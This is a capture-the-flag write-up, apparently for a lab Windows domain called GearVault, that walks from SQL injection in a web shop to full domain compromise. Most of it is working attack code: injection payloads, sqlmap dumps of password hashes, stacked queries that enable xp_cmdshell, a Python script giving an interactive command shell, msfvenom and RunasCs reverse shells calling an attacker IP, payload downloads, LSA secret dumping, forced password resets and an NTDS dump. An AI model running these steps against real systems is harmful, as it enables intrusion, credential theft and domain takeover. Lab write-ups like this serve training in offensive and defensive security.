---
title: "Hacksmarter GearVault Writeup"
date: 2026-11-17 15:00:00 +0200
description: "From web store to domain admin"
categories: [Hacksmarter]
tags: [active-directory, bloodhound, backup-operator, SQL_Injection, impacket, evil-winrm]
media_subpath: /assets/gearvault-img
---

## Subdomain enumeration

During subdomain enumeration, we see the subdomain shop.gearvault.local.

![Subdomain fuzzing](subdomain_fuzzing.png)

After going on the site and hovering over the categories, we can see it's redirecting us to `Default.aspx?search=Backpacks`.

![GearVault shop page](site_page.png)

## SQL injection

After adding a `'` to Backpacks, we can see an error.

![SQL error](SQL_error.png)

We can search for "MSSQL error-based SQL injection" to test if the website is vulnerable to SQL injection.

![Testing an error-based payload](mssql_payload.png)

```text
' AND 1=CONVERT(INT, (SELECT @@version))--
```

After pasting this payload, we can see an error with the Microsoft database version.

![Found SQL injection](found_sqli.png)

We can now use sqlmap to dump database information.

```bash
sqlmap -u http://shop.gearvault.local/Default.aspx?search=Backpacks --batch --level 5 --risk 3
```

![sqlmap confirms the injection](sqlmap_confirm.png)

With the `--dbs` parameter, we can see there are 5 databases.

```bash
sqlmap -u http://shop.gearvault.local/Default.aspx?search=Backpacks --batch --dbs
```

![Databases](databases.png)

We can use the GearVaultShop database to dump tables.

```bash
sqlmap -u "http://shop.gearvault.local/Default.aspx?search=Sleeping" -p search --batch -D GearVaultShop --tables
```

![Tables](tables.png)

Now we can dump columns and then dump the database.

```bash
sqlmap -u "http://shop.gearvault.local/Default.aspx?search=Sleeping" -p search --batch -D GearVaultShop -T customers --columns
```

![Columns](columns.png)

```bash
sqlmap -u "http://shop.gearvault.local/Default.aspx?search=Sleeping" -p search --batch -D GearVaultShop -T customers -C Email,Username,PasswordHash --dump --hex
```

![Password hashes](password_hashes.png)

## From db_owner to RCE

Nothing cracked except my test account, and after a while we see that shop_svc is db_owner and we have TRUSTWORTHY ON, so we can do EXECUTE AS OWNER and gain RCE as nt service\mssqlserver.

1. We have to make sure that we are db_owner of GearVaultShop.

    ```text
    http://shop.gearvault.local/Default.aspx?search=Sleeping%20%27%20UNION%20ALL%20SELECT%201,CONVERT(varchar(5),IS_ROLEMEMBER(%27db_owner%27)),%27t%27,0,0,%27x%27--
    ```

    ![db_owner check](db_owner.png)

    We see 1, which means we are db_owner.

2. We have to create a table to get our output because we don't have output on the website.

    ```text
    http://shop.gearvault.local/Default.aspx?search=x%27%3BIF+OBJECT_ID%28%27dbo.gvout%27%29+IS+NULL+CREATE+TABLE+dbo.gvout%28line+varchar%284000%29%29%3B--
    ```

3. Now we are performing privesc.

    ```text
    http://shop.gearvault.local/Default.aspx?search=x%27%3BEXEC%28%27CREATE+PROCEDURE+dbo.gvesc+WITH+EXECUTE+AS+OWNER+AS+BEGIN+EXEC+sp_configure+%27%27show+advanced+options%27%27%2C1%3B+RECONFIGURE%3B+EXEC+sp_configure+%27%27xp_cmdshell%27%27%2C1%3B+RECONFIGURE%3B+END%27%29%3B--
    ```

    ```text
    http://shop.gearvault.local/Default.aspx?search=x%27%3BEXEC+dbo.gvesc%3B--
    ```

4. In this step we are making a query to a process that is going to take out the output of a system command.

    ```text
    http://shop.gearvault.local/Default.aspx?search=x%27%3BEXEC%28%27CREATE+PROCEDURE+dbo.gvrun+%40cmd+varchar%284000%29+WITH+EXECUTE+AS+OWNER+AS+BEGIN+TRUNCATE+TABLE+dbo.gvout%3B+INSERT+INTO+dbo.gvout+EXEC+master..xp_cmdshell+%40cmd%3B+END%27%29%3B--
    ```

5. Enter a system command.

    ```text
    http://shop.gearvault.local/Default.aspx?search=x%27%3BEXEC+dbo.gvrun+%27whoami+%26+hostname%27%3B--
    ```

6. If you did everything correctly, this step will output the command `whoami` and `hostname` to the website.

    ```text
    http://shop.gearvault.local/Default.aspx?search=x%27+UNION+ALL+SELECT+1%2Cline%2C%27t%27%2C0%2C0%2C%27x%27+FROM+dbo.gvout--
    ```

    ![Confirmed RCE](confirmed_RCE.png)

## Automating with Python

To automate that, I made a Python script that will do everything I did above.

```python
#!/usr/bin/env python3
import sys
import re
import html as H
import urllib.parse
import urllib.request
import urllib.error

BASE = "http://shop.gearvault.local/Default.aspx"


def _get(payload, timeout=60):
    url = BASE + "?" + urllib.parse.urlencode({"search": payload})
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")


def _card_rows(html):
    return [H.unescape(x) for x in re.findall(r"card-title'>([^<]*)", html)]


def exec_batch(sql):
    return _get("x';" + sql + "--")


def setup():
    exec_batch(
        "IF OBJECT_ID('dbo.gvout') IS NULL CREATE TABLE dbo.gvout(line varchar(4000));"
        "IF OBJECT_ID('dbo.gvout') IS NOT NULL TRUNCATE TABLE dbo.gvout"
    )
    exec_batch(
        "IF OBJECT_ID('dbo.gvesc') IS NOT NULL DROP PROCEDURE dbo.gvesc;"
        "EXEC('CREATE PROCEDURE dbo.gvesc WITH EXECUTE AS OWNER AS BEGIN "
        "EXEC sp_configure ''show advanced options'',1; RECONFIGURE; "
        "EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE; END')"
    )
    exec_batch("EXEC dbo.gvesc")
    exec_batch(
        "IF OBJECT_ID('dbo.gvrun') IS NOT NULL DROP PROCEDURE dbo.gvrun;"
        "EXEC('CREATE PROCEDURE dbo.gvrun @cmd varchar(4000) WITH EXECUTE AS OWNER AS BEGIN "
        "TRUNCATE TABLE dbo.gvout; INSERT INTO dbo.gvout EXEC master..xp_cmdshell @cmd; END')"
    )


def run(cmd):
    exec_batch("EXEC dbo.gvrun '%s'" % cmd.replace("'", "''"))
    _, html = _get("x' UNION ALL SELECT 1,line,'t',0,0,'x' FROM dbo.gvout--")
    return _card_rows(html)


def cleanup():
    exec_batch(
        "IF OBJECT_ID('dbo.gvclean') IS NOT NULL DROP PROCEDURE dbo.gvclean;"
        "EXEC('CREATE PROCEDURE dbo.gvclean WITH EXECUTE AS OWNER AS BEGIN "
        "EXEC sp_configure ''xp_cmdshell'',0; RECONFIGURE; "
        "EXEC sp_configure ''show advanced options'',0; RECONFIGURE; END')"
    )
    exec_batch("EXEC dbo.gvclean")
    exec_batch(
        "IF OBJECT_ID('dbo.gvrun') IS NOT NULL DROP PROCEDURE dbo.gvrun;"
        "IF OBJECT_ID('dbo.gvesc') IS NOT NULL DROP PROCEDURE dbo.gvesc;"
        "IF OBJECT_ID('dbo.gvclean') IS NOT NULL DROP PROCEDURE dbo.gvclean;"
        "IF OBJECT_ID('dbo.gvout') IS NOT NULL DROP TABLE dbo.gvout"
    )


def main():
    print("[*] setup: db_owner + TRUSTWORTHY -> EXECUTE AS OWNER -> xp_cmdshell ON")
    setup()
    print("[*] ready. commands:  !clean  exit")
    while True:
        try:
            cmd = input("cmd> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not cmd:
            continue
        if cmd in ("exit", "quit"):
            break
        if cmd == "!clean":
            cleanup()
            print("[*] reverted")
            break
        out = run(cmd)
        print("\n".join(out) if out else "(no output)")
    print("[*] bye")


if __name__ == "__main__":
    main()
```

![Python script demo](python_script_demo.png)

## Reverse shell and SYSTEM

Now that we can gain a reverse shell, I will get a reverse shell from https://revshells.com

![Reverse shell generator](reverse_shell.png)

Now with the reverse shell established, we can search for credentials. In C:\inetpub\wwwroot we can see web.config, which will have the password to the shop_svc user.

![shop_svc password](shop_svc_pass.png)

Also we can get NT AUTHORITY\SYSTEM with SeImpersonatePrivilege.

1. The way I did this is I created a Metasploit binary with msfvenom.

    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.211.2 LPORT=9002 -f exe -o reverse.exe
    ```

2. With the script I made earlier, I used Penelope to transform godpotato and reverse.exe. You can do that by python3 http.server.

    ```text
    ATTACKER:
    python3 -m http.server 80

    TARGET:
    wget TUN0_IP/reverse.exe -o rev.exe
    wget TUN0_IP/godpotato.exe -o gp.exe
    ```

3. Once you have 2 files on the target machine, use msfconsole to set up a listener on port 9002 and use GodPotato to gain SYSTEM.

    ```bash
    ./gp.exe -cmd "C:\programdata\rev.exe"
    ```

![SYSTEM via GodPotato](WEB_system.png)

With the Metasploit Kiwi module, we can dump HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets, which contain the password to the b.brown user.

```text
load kiwi

lsa_dump_secrets
```

![LSA secrets dump](lsa_dump.png)

## Domain access and privilege escalation

Now we are authenticating as a domain user.

![Authenticated as domain user](user_auth.png)

In BloodHound we see that b.brown is a member of IT-HELPDESK, which has GenericAll over 5 users.

![BloodHound GenericAll](bloodhound_genericall.png)

After clicking on each user, the most important for us are going to be m.kelly, which is in the remote management group, and c.sanches, which is in the IT-ADMINS group. The simplest method is to change the password over nxc.

```bash
nxc smb DC01.gearvault.local -u b.brown -p 'REDACTED' -M change-password -o USER='m.kelly' NEWPASS='P@ssw0rd'
```

![Changing password](changing_pass.png)

After changing the password for m.kelly, we can use evil-winrm to connect to the machine.

```bash
evil-winrm -u m.kelly -p P@ssw0rd -i DC01.gearvault.local
```

In C:\ we see 2 folders, backups and IT, but as m.kelly we don't have access to them.

![Access denied](access_denied.png)

Now c.sanches will be handy. Changing his password allows us to gain access using RunasCs.exe.

1. Upload RunasCs.exe to the target machine.

    ```text
    upload /opt/SharpCollection/NetFramework_4.7_Any/RunasCs.exe
    ```

2. We are using RunasCs to run a process as c.sanches.

    ```bash
    .\runascs.exe c.sanches P@ssw0rd cmd.exe -r 192.168.211.2:4444
    ```

![c.sanches shell](c.sanches_shell.png)

Now we have access to the IT folder and we can get the password to the svc-backup account.

![svc-backup password](svc_backup.png)

Using nxc will tell us that this account is disabled.

![svc-backup disabled](svc-backup_disabled.png)

In C:\IT\Scripts\ we can see a binary we can use to enable this user and get the NTLM hash of the local administrator.

```bash
.\Unlock-Account.exe svc-backup
```

![Enabling backup account](enabling_backup.png)

## NTDS dump

Now using nxc we can dump SAM using the backup_operator module.

```bash
nxc smb DC01.gearvault.local -u svc-backup -p 'REDACTED' --smb-timeout 60 -M backup_operator
```

![SAM dump](SAM_dump_DC01.png)

We see an administrator hash, but it does not work, and we have to use a DC01 machine account hash, which is more than enough to perform NTDS dump with secretsdump.

```bash
impacket-secretsdump 'gearvault.local/DC01$'@DC01.gearvault.local -hashes :NTHASH
```

![NTDS.dit dump](NTDS_dit.dump.png)

Thanks for reading, and see you next time.
